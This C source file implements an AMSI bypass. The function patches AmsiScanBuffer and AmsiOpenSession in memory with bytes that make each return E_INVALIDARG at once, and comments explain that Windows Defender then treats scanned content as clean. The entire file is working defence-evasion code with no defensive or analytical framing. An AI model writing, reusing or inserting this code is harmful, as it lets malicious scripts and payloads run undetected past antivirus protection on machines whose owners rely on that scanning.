#include "amsi_bypass.h"
#include <windows.h>
#include <string.h>

/*
 * Patch AmsiScanBuffer to return 0x80070057 (E_INVALIDARG) immediately.
 * Windows Defender and other AMSI consumers treat this as a failed scan
 * and do not block execution — the buffer is considered CLEAN.
 *
 * Patch bytes (x86-64):
 *   B8 57 00 07 80   mov eax, 0x80070057
 *   C3               ret
 */
bool jocky_bypass_amsi(void) {
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) {
        hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi)
            return true;  /* amsi.dll absent — nothing to bypass */
    }

    FARPROC pScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pScan)
        return false;

    DWORD old_protect;
    if (!VirtualProtect((LPVOID)pScan, 6, PAGE_EXECUTE_READWRITE, &old_protect))
        return false;

    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
    memcpy((void*)pScan, patch, sizeof(patch));
    VirtualProtect((LPVOID)pScan, 6, old_protect, &old_protect);

    /*
     * Also patch AmsiOpenSession — if AMSI session creation fails, the
     * scan is skipped entirely for that context (belt-and-suspenders).
     */
    FARPROC pOpen = GetProcAddress(hAmsi, "AmsiOpenSession");
    if (pOpen) {
        DWORD op2;
        if (VirtualProtect((LPVOID)pOpen, 6, PAGE_EXECUTE_READWRITE, &op2)) {
            memcpy((void*)pOpen, patch, sizeof(patch));
            VirtualProtect((LPVOID)pOpen, 6, op2, &op2);
        }
    }

    return true;
}
